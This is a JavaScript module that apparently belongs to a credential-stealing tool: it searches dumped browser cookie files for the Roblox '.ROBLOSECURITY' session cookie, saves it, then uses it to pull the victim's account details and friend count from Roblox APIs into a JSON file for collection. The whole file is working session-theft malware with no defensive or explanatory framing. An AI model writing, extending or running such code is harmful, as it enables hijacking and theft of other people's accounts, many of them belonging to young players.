const { join } = require('path');
const fs = require('fs');
const { tempFolder } = require('../index');
const { searchForFile } = require('../util/dir');
const axios = require('axios');
const { writeFileSync } = require('fs');

module.exports = async () => {
  for (const browser of fs.readdirSync(join(tempFolder, 'Browsers')).filter(f => f.split('.').length >= 1)) {
    const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
    let line = await searchForFile(file, 500);
    if (!line) return;
    line = fs.readFileSync(file).toString().split('\n').find(l => l.includes('.roblox.com') && l.includes('.ROBLOSECURITY'));
    if (!line) return;
    const cookie = line.split(',')[2];
    fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
  }

  const file = await searchForFile(join(tempFolder, 'Roblox Cookie.txt'), 1000, 10);
  if (!file || file.trim() === '') return;
  const jsonFile = join(tempFolder, 'Roblox.json');
  const config = {
    headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') }
  };
  const account = await axios.get('https://www.roblox.com/mobileapi/userinfo', config);
  const friendsCount = await axios.get('https://friends.roblox.com/v1/my/friends/count', config) || undefined;
  account.data.cookie = file.replaceAll('"', '');
  account.data.friendsCount = friendsCount.data.count;
  writeFileSync(jsonFile, JSON.stringify(account.data));
};
